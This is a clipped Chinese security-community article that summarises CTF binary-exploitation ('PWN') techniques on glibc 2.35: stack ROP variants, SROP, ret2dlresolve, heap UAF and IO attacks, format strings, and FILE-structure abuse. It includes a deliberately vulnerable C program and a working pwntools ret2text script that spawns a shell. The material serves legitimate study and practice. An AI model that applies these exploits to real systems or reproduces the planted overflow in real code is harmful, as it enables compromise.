---
title: "PWN核心利用手法归纳总结-先知社区"
source: "https://xz.aliyun.com/news/91995"
author:
published:
created: 2026-06-10
description: "先知社区是一个安全技术社区，旨在为安全技术研究人员提供一个自由、开放、平等的交流平台。"
tags:
  - "clippings"
---
---
title: "PWN核心利用手法归纳总结-先知社区"
source: "https://xz.aliyun.com/news/91995"
author: ""
published: ""
created: "2026-06-10T21:10:41+08:00"
description: "先知社区是一个安全技术社区，旨在为安全技术研究人员提供一个自由、开放、平等的交流平台。"
tags: [clippings]
---

# PWN核心利用手法归纳总结-先知社区

速通PWN

本文手法并不是那种可行可不行的看出题人程序保护开启或者特定情境的手法，是大保底的通用手法

本实验是为了快速回忆，模版并不是那么的万能，主要是降低测试漏洞可行性的成本。

实验模型是全漏洞，逆向成本几乎为0，主要是去研究漏洞利用

只在难点进行略微注释，内容并不是详尽，因为涉及内容很多，所以尽可能多的进行压缩

实验使用的是首次经历大变革之后的2.35的libc进行的实验，暂未选择二次大变革2.42之上的libc

题目编译参考

gcc -fno-stack-protector -z execstack -no-pie -fno-PIE -Wl,-z,norelro -D\_FORTIFY\_SOURCE=0 -O0 stack.c -o stack

现代栈

实验源码

#include <stdio.h>

#include <stdlib.h>

void vuln(){

char buf\[0x40\];

read(0, buf, 0x100);

}

void backdoor(){

system("/bin/sh");

}

void gift(){

\_\_asm\_\_(

"pop rdi\\n\\t"

"ret\\n\\t"

);

}

void init(){

setvbuf(stdin, 0, 2, 0);

setvbuf(stdout, 0, 2, 0);

setvbuf(stderr, 0, 2, 0);

}

int main(){

init();

vuln();

return 0;

}

关卡一：ret2text

from pwn import \*

context.arch = 'amd64'

context.terminal = \['tmux', 'splitw', '-l 100'\]

context.log\_level = 'debug'

io = process('./stack')

libc = ELF('/lib/x86\_64-linux-gnu/libc.so.6')

pr = lambda x:success('\\x1b\[01;38;5;214m'+hex(x)+'\\x1b\[0m')

sl = lambda x:io.sendline(x)

s = lambda x:io.send(x)

rt = lambda x:io.recvuntil(x)

ri = lambda x:int(io.recv(x),16)

ru = lambda x:u64(io.recv(x).ljust(8,b'\\x00'))

it = lambda:io.interactive()

sp = lambda:sleep(1.5)

q = lambda:sleep(0.2)

def duan(a):

gdb.attach(io,'b \*'+ f'{a}')

#duan(0x40119D)

pd = b'a'\*0x48

pd += p64(0x000000000040101a)

pd += p64(0x4011A0)

s(pd)

it()

关卡二：ret2libc

关卡三：ret2shellcode

关卡四：ret2srop

这里的话是frame栈帧在高地址，然后返回地址是sigreturn的调用，默认执行frame栈帧，和ret2shellcode执行的方式不一样

![](https://xzfile.aliyuncs.com/media/upload/picture/20260419100043-92c322e6-3b93-1.png)

关卡五：ret2dlresolve

这里的调用read的时候要注意rdx的数值，避免没有写入我们伪造的结构体

关卡六：ret2hellor

这个手法有个限制，这里puts的话需要额外的有一个mov eax,rdi这个操纵，没有的话就不能用这个手法

这个题目没有这个汇编指令的片段，所以说是不能用这个手法的

关卡七：ret2all

单次srop的话是很简单的，多次srop的话可以布局好一次一次调用，也可以调用read一次性大量写入，然后连续执行，之前都是用的提前准备好堆风水，以后遇到的话可以尝试第二个方式

下面这个模版是最简单的那种，binsh需要自己写入，然后用写入bss的地址即可

原理都是一样的，禁用execve，调整一下寄存器的数值即可，根据下面这个内存布局进行微量的修改就行就行

现代堆

实验源码

关卡一：UAF + IO

malloc申请的输入size=0x400的时候是进入tcache的

最基础largebinattack和apple2（最小空间利用）的模版

关卡二：溢出+IO

本质上还是构造uaf，实验源码加上一个delete清零即可

现代格式化字符串

实验源码

栈上和非栈上略微改改就行

关卡一：栈上通解

fmt\_payload直接改就行

我们可以改下面这两个返回地址

\-> 进入 exit

\-> 调.fini\_array\[0\] // 你改成 main，第一次“重启”

\-> main 返回

\-> 回到退出流程

\-> 调 \_fini // 你又改成 main，第二次“重启”

\-> main 返回

\-> 回到退出流程

![](https://xzfile.aliyuncs.com/media/upload/picture/20260419100127-ace7d9e0-3b93-1.png)

关卡二：非栈上通解

先把目标地址写到栈上，然后再进行修改

第一次泄露+重启，因为fini\_array天然就是一个是栈上存在的点

第二次改返回地址测试

第三次改返回地址+半字节rop链铺垫

其他：FILE结构体

实验源码

关卡：利用stdin覆写stdout

伪造stdin结构体的情况如下

![](https://xzfile.aliyuncs.com/media/upload/picture/20260424172353-4fd35d06-3fbf-1.jpg)

这里我们是通过read写入的，所以说需要伪造一下虚表

实际比赛中一般是scanf写入，并且会给一个任意地址写某个字节，效果的话和stdin这个伪造的效果一样，这个时候主需要关注那几个地址就行

stdout的主要是搞好magicgadget-->fake\_xdr\_ops\_addr-->add\_rsp的跳转就行